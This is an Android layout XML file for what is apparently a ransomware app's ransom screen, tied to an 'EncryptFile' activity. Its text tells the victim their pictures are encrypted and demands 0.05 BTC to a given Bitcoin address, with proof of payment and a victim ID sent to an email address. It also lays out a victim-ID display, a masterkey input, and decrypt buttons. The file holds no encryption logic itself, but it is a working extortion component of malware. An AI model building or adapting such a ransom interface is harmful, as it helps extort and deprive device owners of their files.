<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:weightSum="1"
    android:id="@+id/encryptLayout"
    tools:context=".EncryptFile">


    <TextView
        android:id="@+id/textView"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="
        \n\nYour device has been infected with ransomware. All your Pictures has been encrypted.
        \n\nTo decrypt and get your pictures back, do the following:
        \n\n\t- Transfer 0.05 BTC to mww3grDxLJ8HyxtMAgMM7uTwdSkRdxynWt
        \n\n\t- Send a screenshot of the payment and your victimID to notmyproblem@teleworm.hk
        \n\n\t- After receiving the masterkey from us, enter the masterkey and press MASTER DECRYPT button
        \n\n\t- Press the DECRYPT button after pressing the MASTER DECRYPT button

        \n\n\Your victim ID:" />

    <TextView
        android:id="@+id/victimID"
        android:layout_width="match_parent"
        android:layout_height="58dp"
        android:text="TextView"
        app:layout_constraintBottom_toTopOf="@+id/btn_encrypt"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintHorizontal_bias="0.498"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.58" />

    <EditText
        android:id="@+id/input_masterkey"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="56dp"
        android:hint="Enter Masterkey"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/btn_decrypt" />

    <Button
        android:id="@+id/btn_masterdecrypt"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="32dp"
        android:text="MASTER DECRYPT"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/input_masterkey"
        app:layout_constraintVertical_bias="0.0" />

    <Button
        android:id="@+id/btn_decrypt"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="24dp"
        android:text="DECRYPT"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent" />

</LinearLayout>